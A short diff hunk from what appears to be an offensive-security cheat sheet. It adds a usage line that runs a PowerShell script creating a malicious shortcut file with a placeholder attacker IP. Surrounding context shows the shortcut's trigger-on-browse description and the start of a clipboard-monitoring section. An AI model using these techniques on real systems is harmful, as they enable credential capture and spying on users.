@@ -719,7 +719,9 @@ $lnk.Description = "Browsing to the directory where this file is saved will trig
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
-
+````
+.\lnk_create.ps1 -AttackerIP "Attacker_IP"
+````
 ### Clipboard Monitoring
 ```powershell
 # Monitor clipboard activity
